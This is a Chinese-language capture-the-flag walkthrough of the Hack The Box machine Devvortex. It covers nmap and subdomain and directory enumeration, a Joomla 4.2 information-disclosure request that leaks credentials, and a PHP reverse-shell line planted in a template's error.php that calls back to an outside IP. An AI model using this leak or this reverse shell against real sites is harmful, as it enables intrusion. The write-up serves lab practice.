# Devvortex

```
nmap -sS -A -sV -sC -p- --min-rate 5000 -T4 10.129.171.193
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-27 16:38 CST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.92% done; ETC: 16:39 (0:00:33 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 3.65% done; ETC: 16:38 (0:00:26 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 6.22% done; ETC: 16:39 (0:00:30 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 6.99% done; ETC: 16:38 (0:00:27 remaining)
Warning: 10.129.171.193 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.171.193
Host is up (0.49s latency).
Not shown: 50783 filtered tcp ports (no-response), 14750 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Aggressive OS guesses: Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.8 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.1 (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%), Linux 5.0 - 5.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   607.91 ms 10.10.14.1
2   608.43 ms 10.129.171.193

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.23 seconds
```

将扫描出来的虚拟域名添加到hosts文件中

翻看了80端口没有发现什么可以和服务端交互的功能

尝试爆破子域名

```
wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u "http://devvortex.htb/" -H "Host: FUZZ.devvortex.htb" --hl 7 
```

发现存在dev.devvortex.htb子域名，推测这个域名又是一个虚拟主机的域名，在hosts文件里修改dev.devvortex.htb与ip地址的映射

扫描下目录

```
gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -r -x asp,cgi,txt,log,conf,cgi-bin,bak,db,git -t 1000 --no-error -b 502 --exclude-length 3653
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb
[+] Method:                  GET
[+] Threads:                 1000
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   502
[+] Exclude Length:          3653
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,log,bak,git,asp,cgi,conf,cgi-bin,db
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://dev.devvortex.htb/images               (Status: 200) [Size: 31]
http://dev.devvortex.htb/templates            (Status: 200) [Size: 31]
http://dev.devvortex.htb/home                 (Status: 200) [Size: 23221]
http://dev.devvortex.htb/plugins              (Status: 200) [Size: 31]
http://dev.devvortex.htb/language             (Status: 200) [Size: 31]
http://dev.devvortex.htb/components           (Status: 200) [Size: 31]
http://dev.devvortex.htb/README.txt           (Status: 200) [Size: 4942]
http://dev.devvortex.htb/cache                (Status: 200) [Size: 31]
http://dev.devvortex.htb/robots.txt           (Status: 200) [Size: 764]

```

在readme.txt中看到joomla的版本为4.2

在网上找到一个信息泄露的漏洞

poc

```
http://joomla_host/api/index.php/v1/config/application?public=true
```

拿到joomla用户凭据

```
lewis:P4ntherg0t1n5r3c0n##
```

登录后台，修改模板处在error.php中添加反弹shell语句

```php
<?php system('bash -c "bash -i >& /dev/tcp/192.168.45.226/443 0>&1"'); ?>
```

![image-20231128132648734](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20231128132648734.png)

访问/administrator/templates/atum/error.php触发反弹shell命令

拿到shell后没有权限读取/home/logan/users.txt

尝试用joomla用户账密登录mysql数据库（密码复用错误配置）












